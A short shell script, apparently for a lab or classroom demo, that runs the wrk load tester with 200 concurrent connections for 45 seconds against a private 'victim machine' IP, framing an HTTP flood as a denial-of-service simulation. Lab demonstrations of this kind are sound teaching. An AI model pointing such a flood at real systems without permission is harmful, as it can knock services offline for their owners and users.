#!/bin/sh

# CHANGE THIS to your victim machine's IP/port (must end with / for path)
TARGET="http://10.93.195.220:80/"

# Tune these for your demo
THREADS=4       # usually = number of CPU cores on attacker machine
CONNECTIONS=200 # concurrent connections
DURATION=45s    # how long to run (e.g., 30s, 60s, 2m)

echo "Starting wrk HTTP load simulation against $TARGET"
echo "Threads: $THREADS | Connections: $CONNECTIONS | Duration: $DURATION"

wrk -t"$THREADS" -c"$CONNECTIONS" -d"$DURATION" "$TARGET"

echo "Simulation finished."
